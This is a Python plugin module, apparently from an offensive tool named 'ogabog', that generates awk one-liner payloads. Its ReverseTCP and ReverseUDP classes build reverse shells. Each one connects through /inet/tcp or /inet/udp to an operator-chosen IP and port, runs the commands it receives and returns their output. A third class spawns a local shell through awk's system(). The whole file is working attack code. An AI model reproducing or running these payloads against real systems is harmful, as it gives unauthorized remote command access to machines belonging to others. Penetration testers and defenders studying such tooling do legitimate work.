from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.shell_type = 1
        self.is_interactive = False
        self.protocol = "tcp"
        self.opts.description = "https://gtfobins.github.io/gtfobins/awk/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = "awk 'BEGIN {s = \""
        if self.protocol == "udp":
            self.shell += f"/inet/udp/0/{self.args.ip}/{self.args.port}\";"
        else:
            self.shell += f"/inet/tcp/0/{self.args.ip}/{self.args.port}\";"
        self.shell += "while(42) { do{ printf \"shell>\" |& s; s |& getline c; "
        self.shell += "if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } "
        self.shell += "while(c != \"exit\") close(s); }}' /dev/null"


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.protocol = "udp"
        self.opts.description = "https://gtfobins.github.io/gtfobins/awk/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"


class Shell(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        self.shell_type = 0
        self.is_interactive = True
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--command",
            default="awk",
            choices=["awk", "gawk", "nawk, mawk"],
            help="Select awk command on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/awk/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = "awk 'BEGIN {system(\"" + self.args.shell + "\")}'"
